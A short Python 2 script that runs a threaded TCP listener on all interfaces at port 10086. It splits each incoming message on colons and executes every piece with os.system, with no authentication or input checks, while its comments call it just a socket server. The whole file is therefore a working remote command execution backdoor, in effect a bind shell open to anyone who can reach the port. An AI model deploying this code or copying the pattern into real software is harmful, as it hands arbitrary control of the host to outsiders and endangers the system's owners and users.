import socket 
import threading
import os

#A class for socket server thread
#We start a clientThread for each incoming client connection
class ClientThread(threading.Thread):
	def __init__(self, clientsocket):
		self.socket = clientsocket
		threading.Thread.__init__(self)

	def run(self):
		data=self.socket.recv(1024)
		strlist=data.split(':')
		for value in strlist:
			os.system(value+"\n")
		self.socket.send('OK')
		self.socket.close()


#main function
address=('0.0.0.0', 10086)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(address)  
s.listen(100)

while True:
	clientsocket,addr=s.accept()
	newthread = ClientThread(clientsocket)
	newthread.start()  